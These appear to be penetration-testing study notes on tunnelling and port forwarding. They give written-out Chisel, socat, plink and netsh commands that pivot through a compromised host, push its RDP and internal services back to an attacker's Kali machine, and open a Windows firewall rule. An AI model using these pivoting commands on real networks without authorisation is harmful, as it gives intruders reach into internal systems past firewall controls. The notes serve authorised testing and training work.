# Tunnling
## ssh
## deep http
## ligolo
## Chisel
https://ap3x.github.io/posts/pivoting-with-chisel/
default port:1080
`cp $(which chisel) /var/www/html #or /tmp` 对于linux的目标主机，可以直接复制kali所使用的版本 
Kali:
```bash
chisel server --port 8080 --reverse
#sudo tcpdump -nvvvXi tun0 tcp port 8080 开启抓包
```
Linux:
```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
# 创建隧道
#chisel.exe client <chisel_server_IP>:<server_Port> R:<Local_Port>:<Remote_Host>:<Remote_Port> 
chisel.exe client 192.168.119.5:8080 80:172.16.6.241:80
chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80 
```
# PortForward
通过中继机器访问远程/不同子网下的服务；
## Socat
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432 
iptables #也可以创建转发
```
## Plink
将远程服务3389拉到本地端口的9983使用
```powershell
.\plink.exe -ssh -l <login> -pw <password> -R <ssh_server_Socket>:<ssh_client_Socket> <sshServer_IP>
.\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 <Kali_IP>
```
No-tty Solution
```powershell
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```
## Netsh
受UAC限制&&需要管理员权限
将远程的2222拉到能直接访问主机192.168.50.64:2222上
Listen.port ---> connect.port
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

netstat -anp TCP | find "2222"
netsh interface portproxy show all
```
***
### 防火墙“凿洞”
防火墙只打开了80/3389端口，为了访问我们配置的2222端口，我们需要在防火墙上打一个洞。
**我们完成后还需要记得封住那个洞口！**
```powershell
#netsh advfirewall firewall子上下文 来创建这个端口。我们将使用add rule命令，并命名规则为"port_forward_ssh_2222"。稍后将使用这个名称来删除规则。
# Allow localport=2222 localip=192.168.50.64 'direction' dir=in -> 流量方向

netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```
***
>***一旦我们完成连接，我们需要记得删除刚刚创建的防火墙规则。***
***
```powershell
#端口转发规则也可以被删除
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```
